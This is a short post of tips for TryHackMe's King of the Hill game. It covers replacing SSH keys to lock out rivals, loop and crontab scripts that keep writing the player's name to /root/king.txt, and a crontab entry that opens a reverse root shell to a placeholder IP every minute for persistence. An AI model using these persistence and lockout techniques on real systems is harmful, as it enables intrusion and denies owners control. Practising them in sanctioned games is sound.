## Simple Tricks I use While Playing King Of The Hill

Hey guys, hope you're doing well :) 

For those who are playing [TryHackMe](https://tryhackme.com) [king of the hill](https://www.tryhackme.com/games/koth)... 

These are some tips/tricks I usually do

First thing I do when I get into the machine is deleting ssh keys and put mine

To generate id_rsa & id_rsa.pub you could use ssh-keygen

Then, enter the machine using `ssh -i id_rsa remote_username@remote_host` 

using this simple trick only you can enter the machine using ssh...

To automate putting ur username inside king.txt and make sure that there's no username except yours,u can create a simple script to do that 

```
#!/bin/bash
while :
do
        eval "echo [usernameHere] >> /root/king.txt"
        eval " > /root/king.txt"
done

#this script is created in 1 min :P
```
or by simpler way
```
while [[ $(cat /root/king.txt) != "[usernameHere]" ]]; do echo "[usernamehere]" >> /root/king.txt; done

#this script is created in less than minute :P

```

also u can add your username automatically by putting inside /etc/crontab

`* * * * * echo "[usernameHere]" >> /root/king.txt >/dev/null 2>&1`

and below command can be used to get persistence on the system but run it after getting root access so every minute you can get shell as root in case of someone is trying to kill your terminal else if you do this without getting root you'll get shell as normal user not as root user
`* * * * * /bin/bash -c "/bin/bash -i >& /dev/tcp/[IP_ADDR]/4444 0>&1"`

So this one trick is to check, what loop is running if it is not yours then how you can find that loop and kill it
`<i><b>so for this you can check proccesses running on top in "top" command the running proccesses will be there with their PIDs</b></i>`

<i><b>there is another version of htop is also available in our machines that is "htop" but "htop" may not be available on koth machines</b></i>


#SimpleButEffective
#staySafe
